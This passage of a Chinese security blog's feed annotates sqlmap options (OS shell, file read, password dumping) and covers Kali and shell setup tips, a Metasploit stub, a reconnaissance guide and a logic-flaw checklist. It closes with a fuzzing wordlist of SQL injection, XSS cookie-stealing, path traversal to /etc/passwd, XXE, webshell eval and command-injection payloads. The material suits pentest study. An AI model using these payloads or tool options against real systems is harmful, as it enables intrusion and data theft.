    --current-db        Retrieve DBMS current database
        检索当前连接的数据库
    --hostname          Retrieve DBMS server hostname
        检索服务器的主机名
    --is-dba            Detect if the DBMS current user is DBA
        检测是不是dba，就是root权限咯
    --users             Enumerate DBMS users
        枚举数据库用户
    --passwords         Enumerate DBMS users password hashes
        枚举数据库用户的哈希值
    --privileges        Enumerate DBMS users privileges
        枚举数据库用户的权限
    --roles             Enumerate DBMS users roles
        枚举数据库用户的角色
    --dbs               Enumerate DBMS databases
        枚举数据库有哪些
    --tables            Enumerate DBMS database tables
        枚举数据表名
    --columns           Enumerate DBMS database table columns
        枚举列名
    --schema            Enumerate DBMS schema
        这个测试过，将所有的数据库的表的基本信息都枚举了，有哪些列，列的数据类型，具体数据就没有枚举
    --count             Retrieve number of entries for table(s)
        枚举表格个数
    --dump              Dump DBMS database table entries
        输出数据库表的数据
    --dump-all          Dump all DBMS databases tables entries
        输出所有
    --search            Search column(s), table(s) and/or database name(s)
        查找特定的列名，表名或数据库名，配合下面的-D,-C,-T
    --comments          Retrieve DBMS comments
        枚举数据库的注释
    -D DB               DBMS database to enumerate
        指定数据库名
    -T TBL              DBMS database table(s) to enumerate
        指定表名
    -C COL              DBMS database table column(s) to enumerate
        指定列名
    -X EXCLUDECOL       DBMS database table column(s) to not enumerate
        指定不枚举那个列
    -U USER             DBMS user to enumerate
        枚举用户，但单独用这个参数感觉没什么用啊，这个可能要看源码才能解决了，估计要配合其他参数
    --exclude-sysdbs    Exclude DBMS system databases when enumerating tables
        枚举时排除系统的数据库
    --pivot-column=P..  Pivot column name
        以某一列为核心？这个用过没感觉出什么用
    --where=DUMPWHERE   Use WHERE condition while table dumping
        使用where调试限制table的输出
    --start=LIMITSTART  First query output entry to retrieve
        指定开始从第几行开始输出，如--start=3，前两行就不输出了
    --stop=LIMITSTOP    Last query output entry to retrieve
        指定从第几行开始停止输出
    --first=FIRSTCHAR   First query output word character to retrieve
        指定只输出第几个字符开始输出，盲注才有效，亲测
    --last=LASTCHAR     Last query output word character to retrieve
        指定只输出第几个字符停止输出，盲注才有效，亲测，跟上面的配合指定范围，
        如 ：--first 3 --last 5  只输出3到5位置的字符
    --sql-query=QUERY   SQL statement to be executed
        指定执行我们的sql语句
    --sql-shell         Prompt for an interactive SQL shell
        返回一个sql的shell
    --sql-file=SQLFILE  Execute SQL statements from given file(s)
        从文件中读取执行sql语句
 
  Brute force: 爆破
    These options can be used to run brute force checks
 
    --common-tables     Check existence of common tables
        检测常见的表名
    --common-columns    Check existence of common columns
        检测常见的列名
 
  User-defined function injection: 使用用户定义的函数注入
    These options can be used to create custom user-defined functions
 
    --udf-inject        Inject custom user-defined functions
    --shared-lib=SHLIB  Local path of the shared library
        这两个具体没用过，直译就是注入用户定义的函数，另一个就是指定本地共享库
 
  File system access:  文件系统访问
    These options can be used to access the back-end database management
    system underlying file system
 
    --file-read=RFILE   Read a file from the back-end DBMS file system
        读取服务器文件
    --file-write=WFILE  Write a local file on the back-end DBMS file system
        写服务器文件
    --file-dest=DFILE   Back-end DBMS absolute filepath to write to
        设置写入的绝对路径
 
  Operating system access:  操作系统访问
    These options can be used to access the back-end database management
    system underlying operating system
 
    注意下面这些要有相应的权限，一般要root
 
    --os-cmd=OSCMD      Execute an operating system command
        执行一个指定的命令
    --os-shell          Prompt for an interactive operating system shell
        返回一个shell
    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC
        这个参数需要访问metasploit，结合metasploit使用的
    --os-smbrelay       One click prompt for an OOB shell, Meterpreter or VNC
        这个参数也需要访问metasploit
    --os-bof            Stored procedure buffer overflow exploitation
        尝试储存过程的缓冲区溢出
    --priv-esc          Database process user privilege escalation
        利用数据库进程用户进行权限提升
    --msf-path=MSFPATH  Local path where Metasploit Framework is installed
        指定metasploit的路径
    --tmp-path=TMPPATH  Remote absolute path of temporary files directory
        设定临时文件路径
 
  Windows registry access: windows注册表访问
    These options can be used to access the back-end database management
    system Windows registry
 
    --reg-read          Read a Windows registry key value
        读取一个键
    --reg-add           Write a Windows registry key value data
        写一个键
    --reg-del           Delete a Windows registry key value
        删除一个键
下面的应该配合上面使用的
    --reg-key=REGKEY    Windows registry key
        指定键
    --reg-value=REGVAL  Windows registry key value
        指定键值
    --reg-data=REGDATA  Windows registry key value data
        值的数据
    --reg-type=REGTYPE  Windows registry key value type
        值得类型
 
  General: 通用的
    These options can be used to set some general working parameters
 
    -s SESSIONFILE      Load session from a stored (.sqlite) file
        从.sqlite恢复那个会话（注入过就会自动生成），那个文件在sqlmap的output文件，（windows在C:\Users\Administrator\.sqlmap\output\）
    -t TRAFFICFILE      Log all HTTP traffic into a textual file
        HTTP请求保存到文件中
    --batch             Never ask for user input, use the default behaviour
        不要询问，使用默认选项
    --binary-fields=..  Result fields having binary values (e.g. &quot;digest&quot;)
        设置有些字段是二进制数值？
    --charset=CHARSET   Force character encoding used for data retrieval
        设置编码
    --crawl=CRAWLDEPTH  Crawl the website starting from the target URL
        从某个url开始爬取网站
    --crawl-exclude=..  Regexp to exclude pages from crawling (e.g. &quot;logout&quot;)
        排除爬取网站的关键字，如logout
    --csv-del=CSVDEL    Delimiting character used in CSV output (default &quot;,&quot;)
        设置输出结果时的分隔符
    --dump-format=DU..  Format of dumped data (CSV (default), HTML or SQLITE)
        设置输出是的格式，csv，html，SQLITE等
    --eta               Display for each output the estimated time of arrival
        显示每个输出估计的耗时
    --flush-session     Flush session files for current target
        刷新这个url的储存会话信息，就是更新以前注入的记录，如管理员改密码了，就要重新注入了
    --forms             Parse and test forms on target URL
        解析测试目标url的表单
    --fresh-queries     Ignore query results stored in session file
        忽略保存在会话文件储存的查询结果
    --hex               Use DBMS hex function(s) for data retrieval
        使用十六进制
    --output-dir=OUT..  Custom output directory path
        设置输出路径
    --parse-errors      Parse and display DBMS error messages from responses
        解析输出数据库错误信息
    --save=SAVECONFIG   Save options to a configuration INI file
        保存选项到ini文件
    --scope=SCOPE       Regexp to filter targets from provided proxy log
        正则表达式过滤代理文件提供的代理？
    --test-filter=TE..  Select tests by payloads and/or titles (e.g. ROW)
        设置含我们指定关键字的某些测试的payload
    --test-skip=TEST..  Skip tests by payloads and/or titles (e.g. BENCHMARK)
        跳过测试指定关键字的某些测试的payload
    --update            Update sqlmap
        更新sqlmap，记得更新了
 
  Miscellaneous:  杂项
    -z MNEMONICS        Use short mnemonics (e.g. &quot;flu,bat,ban,tec=EU&quot;)
        短记忆，什么鬼
    --alert=ALERT       Run host OS command(s) when SQL injection is found
        如果存在注入，运行系统命令
    --answers=ANSWERS   Set question answers (e.g. &quot;quit=N,follow=N&quot;)
        设定
    --beep              Beep on question and/or when SQL injection is found
        哔一声，找到注入的话
    --cleanup           Clean up the DBMS from sqlmap specific UDF and tables
        清理数据库什么鬼，这个也不懂   
    --dependencies      Check for missing (non-core) sqlmap dependencies
        看看sqlmap缺少什么第三方库
    --disable-coloring  Disable console output coloring
        关闭颜色的输出，就没那么美观咯
    --gpage=GOOGLEPAGE  Use Google dork results from specified page number
        指定google搜索的页码，找sqlmap注入目标
    --identify-waf      Make a thorough testing for a WAF/IPS/IDS protection
        尝试辨认WAF/IPS/IDS的类型
    --mobile            Imitate smartphone through HTTP User-Agent header
        使用手机User-Agent
    --offline           Work in offline mode (only use session data)
        使用离线模式
    --page-rank         Display page rank (PR) for Google dork results
        显示该url，google的rank值
    --purge-output      Safely remove all content from output directory
        安全地删除output文件夹
    --skip-waf          Skip heuristic detection of WAF/IPS/IDS protection
        跳过探测WAF/IPS/IDS
    --smart             Conduct thorough tests only if positive heuristic(s)
        全面的扫描如果是积极的启发式，不知什么鬼
    --sqlmap-shell      Prompt for an interactive sqlmap shell
        交互式的sqlmap shell
    --tmp-dir=TMPDIR    Local directory for storing temporary files
        设置临时文件目录
    --wizard            Simple wizard interface for beginner users
</code></pre>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[利用Excel轻松更换照片背景色，证件照轻松搞定]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15647294001055.html"/>
    <updated>2019-08-02T15:03:20+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15647294001055.html</id>
    <content type="html"><![CDATA[
<p>参考这篇文章：
<a href="https://baijiahao.baidu.com/s?id=1624373186564333816&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1624373186564333816&amp;wfr=spider&amp;for=pc</a></p>

<p>很实用的技能</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Debian系常用技巧与问题汇总]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15645435828439.html"/>
    <updated>2019-07-31T11:26:22+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15645435828439.html</id>
    <content type="html"><![CDATA[
<h2 id="toc_0">kali install vmtools 安装 vmtools</h2>

<p>复制文件到当前用户目录下
cp /media/cdrom/VMwareTools-10.3.10-12406962.tar.gz .</p>

<p>解压
tar xf VMwareTools-10.3.10-12406962.tar.gz </p>

<p>进去
cd vmware-tools-distrib/</p>

<p>运行安装文件
./vmware-install.pl</p>

<p>不能执行可能是权限问题， chmod +x vmware-install.pl 添加可执行权限即可</p>

<h2 id="toc_1">kali Linux添加add-apt-repository</h2>

<p>先安装Python软件属性程序包
apt-get install python-software-properties</p>

<p>接下来安装apt-file
apt-get install apt-file</p>

<p>更新apt-file
apt-file update</p>

<h2 id="toc_2">kali 安装 typora</h2>

<p>第一步
apt-key adv --keyserver keyserver.ubuntu.com --recv-keys BA300B7755AFCFAE</p>

<p>第二步
add-apt-repository &#39;deb <a href="https://typora.io">https://typora.io</a> linux/&#39;</p>

<p>第三步
apt-get install typora</p>

<p>如果报错可能是缺依赖，安装依赖即可
apt-get install libapt-pkg-dev
apt-get install apt-transport-https
apt-get update</p>

<h2 id="toc_3">kali 下更新软件时报错，说下列签名无效的解决办法</h2>

<p>解决办法就是重新获取下签名key </p>

<p>wget -q -O - <a href="https://archive.kali.org/archive-key.asc">https://archive.kali.org/archive-key.asc</a> | sudo apt-key add</p>

<h2 id="toc_4">debian or ubuntu 修改终端欢迎语</h2>

<p>与其他 linux 不太一样哦。Debian 系直接修改/etc/motd文件重登录后是无效的。</p>

<p>因为这里/etc/motd是一个符号链接，指向/var/run/motd，应该是一个启动后再生成的文件。在版本12.04中，找到生成的脚本在目录/etc/update-motd.d/中
<code>sudo nano /etc/update-motd.d/10-uname</code>
在 10-uname 中可以添加命令，比如：<code>cat /home/test.txt</code>。即可展示出 test.txt 中的内容。</p>

<p>修改后用：sudo run-parts /etc/update-motd.d 去执行就会立即见到效果，而不用反复注销登录。</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Couldn't connect to Docker daemon at http+docker://localhost - is it running?]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15645039971877.html"/>
    <updated>2019-07-31T00:26:37+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15645039971877.html</id>
    <content type="html"><![CDATA[
<p>启动 docker 即可
sudo systemctl start docker   </p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[浏览器问题汇总]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15644638922385.html"/>
    <updated>2019-07-30T13:18:12+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15644638922385.html</id>
    <content type="html"><![CDATA[
<h2 id="toc_0">firefox 总是发送get请求到<a href="http://detectportal.firefox.com/success.txt%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95">http://detectportal.firefox.com/success.txt解决办法</a></h2>

<p>1.在firefox地址栏输入：
about:config</p>

<p>2.搜索如下内容，并将其设置为false</p>

<p>network.captive-portal-service.enadbled</p>

<p><img src="media/15644638922385/15644639826340.jpg" alt="" style="width:981px;"/></p>

<p>转载于:<a href="https://my.oschina.net/u/1771419/blog/3025419">https://my.oschina.net/u/1771419/blog/3025419</a></p>

<h2 id="toc_1">此地址使用了一个通常用于网络浏览以外目的的端口.出于安全原因,Firefox取消了该请求</h2>

<p>遇到标题出现的错误时，可以使用以下方法解决：
1、打开火狐在地址栏输入&quot;about:config&quot;
2、然后在&quot;首选项名称&quot;处点击右键选择&quot;新建&quot;-&quot;字符串&quot;，在弹框中输入&quot;network.security.banned.override&quot;，点确定
3、在再次弹出的框&quot;输入字符串的值&quot;中输入要开放的端口，如666（不行的话就换其他的），最后单击&quot;确定&quot;，即可。</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[oh-my-zsh配置]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15643953233297.html"/>
    <updated>2019-07-29T18:15:23+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15643953233297.html</id>
    <content type="html"><![CDATA[
<h2 id="toc_0">下载安装</h2>

<p><code>sh -c &quot;$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)&quot;</code></p>

<h2 id="toc_1">修改主题</h2>

<p>nano ~/.zshrc 或者 nano /home/lonelyor/.zshrc
ZSH_THEME=&quot;agnoster&quot;</p>

<p>查看可使用的主题列表
<code>ls ~/.oh-my-zsh/themes</code>  </p>

<h2 id="toc_2">更换默认shell</h2>

<p><code>chsh -s /usr/bin/zsh</code>
重启即可看到效果</p>

<h2 id="toc_3">安装插件</h2>

<p>增加插件直接写名字就行，用空格隔开。以下是一个示例。
plugins=(git autojump)</p>

<p>安装文件夹跳转工具 autojump，
sudo pacman -S autojump</p>

<p>把以下代码添加到~/.zshrc才能使 autojump 生效
<code>[[ -s ~/.autojump/etc/profile.d/autojump.sh ]] &amp;&amp; . ~/.autojump/etc/profile.d/autojump.sh</code>    </p>

<p>安装zsh-syntax-highlighting命令高亮插件
<code>git clone https://github.com/zsh-users/zsh-syntax-highlighting.git 
echo &quot;source ${(q-)PWD}/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh&quot; &gt;&gt; ${ZDOTDIR:-$HOME}/.zshrc</code></p>

<p>安装命令自动补全zsh-autosuggestions插件
<code>git clone git://github.com/zsh-users/zsh-autosuggestions $ZSH_CUSTOM/plugins/zsh-autosuggestions ~/.zsh/zsh-autosuggestions</code><br/>
<code>source ~/.zsh/zsh-autosuggestions/zsh-autosuggestions.zsh</code></p>

<p>一键解压，自带的
extract</p>

<p>配置~/.zshrc 文件，添加内容：
plugins=(git autojump  zsh-autosuggestions extract zsh-syntax-highlighting)</p>

<p>请务必保证插件顺序，zsh-syntax-highlighting必须在最后一个。
然后在文件的最后一行添加：source ~/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh</p>

<p>最后使用 source ~/.zshrc 命令让配置生效。</p>

<p>安装 powerline字体
pacman -S powerline-fonts</p>

<p>或者 git clone <a href="https://github.com/powerline/fonts.git">https://github.com/powerline/fonts.git</a>
cd fonts
./install.sh</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Mutillidae 遇到的一个奇怪问题]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15642124072307.html"/>
    <updated>2019-07-27T15:26:47+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15642124072307.html</id>
    <content type="html"><![CDATA[
<p>在进行 dom 型 xss 测试的时候，发现 payload 中输入 x 或 y 会弹窗，其他字母不弹窗。具体如下图所示。
<code>&lt;img src=1 onerror=alert(z)&gt;</code>
<img src="media/15642124072307/15642124281235.jpg" alt="" style="width:1017px;"/></p>

<p><code>&lt;img src=1 onerror=alert(x)&gt;</code>
<img src="media/15642124072307/15642124904179.jpg" alt="" style="width:774px;"/></p>

<p><code>&lt;img src=1 onerror=alert(y)&gt;</code>
<img src="media/15642124072307/15642125078089.jpg" alt="" style="width:769px;"/></p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Metasploit 完全使用教程]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15602308144902.html"/>
    <updated>2019-06-11T13:26:54+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15602308144902.html</id>
    <content type="html"><![CDATA[
<blockquote>
<p>计划写一个 msf 从安装到使用到编写 exploit 的教程，在这里留个坑。本文不适合新手，很多地方不会说的太细致。但是会说清楚。</p>
</blockquote>

<h2 id="toc_0">环境搭建</h2>

<p>1、安装 Postgresql
2、安装 metasploit</p>

<p>关于 metasploit，linux 的话可以使用软件管理器安装；macosx 的话可以使用 brew 安装；windows 别装了，去学 linux 吧。</p>

<p>如果用包管理器安装有问题，则去官网下载二进制文件安装或者 github 下载源码下来，然后给 install 可执行权限，再执行安装。</p>

<p>安装完成之后，使用 alias 命令将<code>/opt/metasploit-framework/bin ./msfconsole</code>（具体路径根据自己安装的实际情况选定）指定成<code>msf</code>，这样以后要用只需要在终端输入 msf 即可立即开始使用。</p>

<h2 id="toc_1">使用入门</h2>

<p>打开终端然后输入 msf 即可启动，如下图所示：
<img src="media/15602308144902/15602325257924.jpg" alt=""/></p>

<p><img src="media/15602308144902/15602325455212.jpg" alt=""/></p>

<p>上图黄字部分表示当前 msf 版本，如果版本过低，请使用<code>msfupdate</code>进行升级（注意执行此命令时终端所在的目录）。</p>

<h2 id="toc_2">使用 msf 进行信息收集</h2>

<p>主动信息收集的第一步通常都是端口扫描</p>

<p><img src="media/15602308144902/15602328461015.jpg" alt=""/></p>

<p>首先查找端口扫描模块，命令<code>search portscan</code>，search 是个非常重要的命令，当我们需要扫描或者利用某个漏洞时，可以使用 search 命令来查找 msf 是否有相关模块。</p>

<p>（未完待续）</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[黑盒测试中的信息收集]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15597856399146.html"/>
    <updated>2019-06-06T09:47:19+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15597856399146.html</id>
    <content type="html"><![CDATA[
<p>信息搜集分为主动搜集和被动搜集，主动搜集会惊动资产方因此需要有所针对，动静越小越好；而被动搜集不会惊动资产方因此更为隐蔽。</p>

<h2 id="toc_0">第一阶段：资产（域名及子域名）搜集</h2>

<p>1、确认目标性质：了解网站所在行业，他是一个黑产赌博色情站、还是政府学校官方站、亦或是金融游戏商业站。了解这类网站通常的安全关注点在哪，那么避开其关注点，就是它的薄弱点。</p>

<p>2、收集目标资产 1：使用搜索引擎搜索关键词（公司名、域名等），找出搜索引擎搜录的相关域名，这里可以用一些现成的工具或者自写爬虫</p>

<p>3、收集目标资产 2：使用子域名扫描器，根据 2 中搜集来的域名进一步进行资产收集。</p>

<p>4、收集目标资产 3：使用爬虫在 3 所在的页面中爬取隐藏页面或引用的 url。</p>

<p>信息搜集是层层递进的，根据上一次收集的信息来进行扩展，尽可能多的收集目标资产、扩大打击面。</p>

<h2 id="toc_1">第二阶段：资产属性收集</h2>

<p>5、得到域名和 ip 相关信息后，对资产进行端口扫描、敏感目录（包括后台、备份文件、隐藏接口、邮箱系统、运维自带后门、github 或网盘泄露等）扫描、GoogleHacking（快照信息、已知后门、代码泄露、已知安全事件）、操作系统版本（win、linux）、web 应用服务器版本（nginx、apache、tomcat 等）、后端框架（spring、flask、thinkphp 等）、网络拓扑（多少主机、路由、交换、网段、DNS服务器等）、防御软硬件信息（防火墙、waf、网闸等）等。并一一记录资产对应的信息。这里还有些值得注意的信息就是：邮箱、手机号、身份证号等个人敏感信息。</p>

<p>6、分析信息并对有效信息进行提取和记录。</p>

<p>比如你可以这样来记录（这只是个例子，信息收集自然是越详细越好）：
<img src="media/15597856399146/15598028215198.jpg" alt=""/></p>

<h2 id="toc_2">第三阶段：资产攻击面分析</h2>

<p>7、收集了各种信息后，就是分析各个资产可能存在的防御薄弱点、分析攻击面。可以从软硬件漏洞、业务、人三个方向来进行分析。</p>

<p>8、收集攻击相关工具、字典等，针对可入侵性高的攻击面进行攻击，此时会获得攻击工具的部分反馈。根据反馈我们可以更好地了解对方的防御措施和脆弱点。根据不同的攻击行为，系统会有不同的反应，分析这些信息对后续展开更深层次的攻击也是有积极意义的。</p>

<p>基本上，到这里，我们就可以开始展开针对性的攻击了。如果物理上离目标近，还可以使用钓鱼二维码、社工、应聘、潜入停车场、办公区域，若网络未做内外网隔离还可以连接办公室 wifi 等方式（连接 wifi 这个绝对是大杀器）。</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[业务逻辑漏洞安全检查checklist]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15596178265897.html"/>
    <updated>2019-06-04T11:10:26+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15596178265897.html</id>
    <content type="html"><![CDATA[
<blockquote>
<p>整理的部分业务逻辑漏洞 checklist，不打算全部公开。</p>
</blockquote>

<h2 id="toc_0">认证</h2>

<p>图形验证码问题（验证码缺失、验证码回显、验证码绕过、验证流程不正确、重放攻击）
手机验证码（短信轰炸、验证码劫持）
会话固定
cookie 伪造/爆破
使用默认凭证（管理后台、数据库密码）
冻结账户策略不当
弱用户名和密码
“记住我”功能缺陷（前端记住/发送密码）
自动登录
单点登录劫持
第三方登录劫持
二维码登录劫持
弱口令
弱安全问题/答案
弱的密码恢复机制
Oauth2.0授权漏洞
JWT安全
注册覆盖
未验证的重定向和转发
双因素认证不当（双因素后获取的凭证，在无需双因素处可以获得）
恶意注册</p>

<h2 id="toc_1">授权</h2>

<p>测试角色定义（授权不当）
权限管理缺失（无权限设计）
匿名访问（备用接口——常见于兼容老的不安全的接口时产生）
水平越权
垂直越权
超级账户
实名认证不严格</p>

<h2 id="toc_2">会话管理</h2>

<p>cookie安全属性
cookie可猜解/伪造
cookie溢出
会话固定漏洞
用户凭证不安全传输（弱加密或明文传输）
用户凭证未一次失效
用户凭证可猜解
注销与会话超时
敏感数据不安全传输（get 方法传输 session）</p>

<h2 id="toc_3">内容安全</h2>

<p>敏感信息过度显示
违法违规信息</p>

<h2 id="toc_4">设计缺陷</h2>

<p>业务一致性（篡改类）漏洞（订单 id、邮箱或用户名、手机号、商品编号、用户 id、支付金额、优惠券金额、商品数量、最大数限制、前端限制绕过）
刷赞、刷关注、刷票、刷奖品
流程绕过（密码找回、支付、登录验证）</p>

<h2 id="toc_5">典型场景</h2>

<p>个人信息
密码找回/修改
支付流程
注册流程
需要手机/邮箱验证的业务</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[最近做了个 fuzzing 字典精简版]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15596171974228.html"/>
    <updated>2019-06-04T10:59:57+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15596171974228.html</id>
    <content type="html"><![CDATA[
<blockquote>
<p>仅用于学习目的，请勿进行违法犯罪活动，也不要用来扫描别人系统，扫描未授权的计算机是犯法的。
本字典可以用来检测（不保证效果、payload 自行琢磨修改）：sql 注入、xss、敏感目录泄露、敏感文件泄露、iis 短文件名、xml 注入、ssrf、远程命令执行、未验证的 url 跳转、任意文件读取等。</p>
</blockquote>

<pre class="line-numbers"><code class="language-text">&#39;
&quot;
[
@
#
%
&amp;
*
(
)
]
/
??
//
\\
../
&lt;!-- 
%20select @@version
)%20or%20(&#39;x&#39;=&#39;x
%20or &#39;a&#39;=&#39;a
%20or 2 &gt; 1
%20or &#39;a&#39;=&#39;a
%20or 1=1
%20and%201=1
%20and%201=2
/**/or/**/1/**/=/**/1
select &#39;10as&#39;=10;
exec master..xp_cmdshell &#39;ipconfig+/all&#39;
%20or &#39;7659&#39;=&#39;7659
%20or &#39;text&#39; = n&#39;text&#39;
) union select * from information_schema.tables;
1+AND+USER_NAME()=’dbo’
1;waitfor+delay+’0:0:10’
1’;shutdown –
as
%20select 1/*!50000union/*!*//*!50000select/*!*/2;
%20or 0=0 #&quot;
&#39; union (select @@version) --
&#39; union (select NULL, (select @@version)) --
&#39; union (select NULL, NULL, (select @@version)) --
&#39; union (select NULL, NULL, NULL,  (select @@version)) --
&#39; union (select NULL, NULL, NULL, NULL,  (select @@version)) --
&#39; union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --
--
/*
1’; insert into users values(‘lonelyor’,’lonelyor’)
%28
%29
&lt;sCrIpt&gt;alErt(‘xss’)&lt;/ScRiPT&gt;
&lt;script&gt;alert(8888)&lt;/script&gt;
&lt;script&gt;confirm(8866)&lt;/script&gt;
&lt;script&gt;prompt(8877)&lt;/script&gt;
a&lt;img src=1 onerror=alert(1)&gt;a
&lt;img src=x onerror=alert(11)&gt;29
&lt;anytag onmouseover=alert(1)&gt;s
&quot;&gt;&lt;img/onload=alert(1)&gt;&#39; -- 
&lt;video onloadstart=alert(1)&gt;&lt;source&gt;
&lt;a onclick=alert(2)&gt;h
&lt;button/onclick=alert(6)&gt;h
&lt;script&gt;\u0061\u006C\u0065\u0072\u0074(8888)&lt;/script&gt;
&lt;script&gt;alert(String.fromCharCode(49,49))&lt;/script&gt;
&lt;body/onload=alert(12)&gt;
&lt;a onmouseover=&quot;alert(document.cookie)&quot;&gt;xxs link&lt;/a&gt;
&lt;scr&lt;script&gt;ipt&gt;alert(&#39;xss&#39;);&lt;/scr&lt;/script&gt;ipt&gt;
&lt;SCRIPT/SRC=&quot;http://xss.rocks/xss.js&quot;&gt;&lt;/SCRIPT&gt;
.git
.gitignore
.svn
wp-admin
wp-login.php
.DS_store
.ds_store
index.php.bak
.index.php~
index.php.~
robots.txt
.git/config
admin/
/admin
uploads/
download/
downloads/
manager/
/include
1.jsp
hack.jsp
1.php
1.asp
/新建文本文档.txt
/etc/passwd
etc/passwd
../../../../etc/passwd
/../../../../etc/passwd
..2f..2fetc2fpasswd
&lt;!--?xml version=&quot;1.0&quot; ?--&gt;&lt;!DOCTYPE replace [&lt;!ENTITY ent SYSTEM &quot;file:///etc/
&lt;%eval request(chr(35))%&gt;
&lt;?=eval($_POST[&#39;cmd&#39;]);
cmd
system(&quot;ls -al /&quot;)
%s%s%s%s%s%s%s%s%s%s
NULL
null
zull
/C:\Program Files\
C:\Program Files\
&lt;!--#exec cmd=&quot;ls&quot; --&gt;
&lt;!--#exec cmd=&quot;dir&quot; --&gt;
&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM &quot;file:////etc/passwd&quot;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
&lt;?xml version=&quot;1.0&quot;?&gt;&lt;change-log&gt;&lt;text&gt;Hello World&lt;/text&gt;&lt;/change-log&gt;
&lt;!DOCTYPE foo [&lt;!ENTITY xxe7eb97 SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;
| ping -i 30 127.0.0.1 |
&amp; ping -i 30 127.0.0.1 &amp;
?url=http://www.zhihu.com/
?url=https://www.zhihu.com/
http://www.lonelyor.org/
https://www.lonelyor.org/
$ENV{&#39;HOME&#39;}
2.2250738585072011e-308
01/01/1979
*~1*/.aspx
a*~1*/.aspx
&lt;h1&gt;haha&lt;/h1&gt;
</code></pre>

]]></content>
  </entry>
  
</feed>
